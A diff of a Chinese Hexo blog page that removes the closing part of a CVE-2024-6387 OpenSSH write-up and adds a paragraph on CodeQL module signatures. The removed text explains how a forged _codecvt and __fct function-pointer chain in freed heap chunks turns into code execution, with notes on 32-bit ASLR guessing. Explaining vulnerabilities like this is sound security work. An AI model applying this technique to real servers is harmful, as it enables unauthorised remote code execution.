-<p>需要注意的是，<code>fopen</code> 并没有对 <code>FILE</code> 结构体的 <code>_codecvt</code> 字段进行初始化，因此依然可以通过提前布置值完成对该字段的控制。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_codecvt        // Glibc 2.36, /libio/libio.h, line 114</span><br><span class="line">  _IO_iconv_t             // Glibc 2.36, /libio/libio.h, line 50</span><br><span class="line">    __gconv_step          // Glibc 2.36, /iconv/gconv.h, line 83</span><br><span class="line">      __gconv_fct __fct</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>从上面的结构定义层次来看，我们需要的 <code>__fct</code> 函数指针经过多层结构包装。为了让提前写入的指针能够完整地构建调用链，攻击者可以选择将 <code>_codecvt</code> 写成 Glibc 的 bins 的地址，这样实际就是让 Glibc 将我们释放的 chunk 的前面一小部分看做 <code>_IO_iconv_t</code> 结构，接下去如法炮制，在已经释放的 chunk 中完成精心构造，即可让代码最终执行我们伪造的 <code>__fct</code> 函数指针，完成任意代码执行。</p>
-<h1 id="d-相关挑战"><a class="markdownIt-Anchor" href="#d-相关挑战"></a> D. 相关挑战</h1>
-<p>该漏洞的利用较为困难，这主要是因为猜测 ASLR 与时间窗口竞争叠加的结果。</p>
-<p>地址空间布局随机化（Address Space Layout Randomization）是一种常用的程序运行时保护方式，多次执行时，同一个段会映射到不同的内存地址。但 glibc 在32位下实际上只会映射到 0xb7400000 或 0xb7200000，因此实现 FSOP 还是有可能的。但是时间竞争窗口较小，导致总体成功率依然极低（实验室环境下6~8小时尝试平均10000次才能成功）。在 64 位强化 ASLR 中，通过猜测 glibc 加载地址进行攻击的利用方式就更加无法实现了，需要通过其他的方式完成漏洞利用。</p>
-<h1 id="e-总结"><a class="markdownIt-Anchor" href="#e-总结"></a> E. 总结</h1>
-<p>CVE-2024-6387 是一个高危的未授权任意代码远程执行漏洞，虽然目前的攻击方式较为复杂，攻击成功所需时间较长，但其危害仍不容忽视。建议升级 OpenSSH 至 9.8v1 及更高版本，或通过防火墙等方式缓解风险。</p>
+<p>在上例中，我们定义了一个模块签名<code>MyModuleTemplate</code>，其中定义了一个谓词，在模块签名中的谓词不需要使用<code>signature</code>，会默认将其看做谓词签名。下面还定义了一个<code>default</code>修饰的谓词，这个谓词可以选择不实现，这样实例化模块中会直接使用<code>default</code>中的谓词逻辑。</p>
 
       
     </div>
@@ -1834,7 +1811,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">162</span>
+          <span class="site-state-item-count">163</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1892,7 +1869,7 @@
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">22:54</span>
+    <span title="站点阅读时长">23:01</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
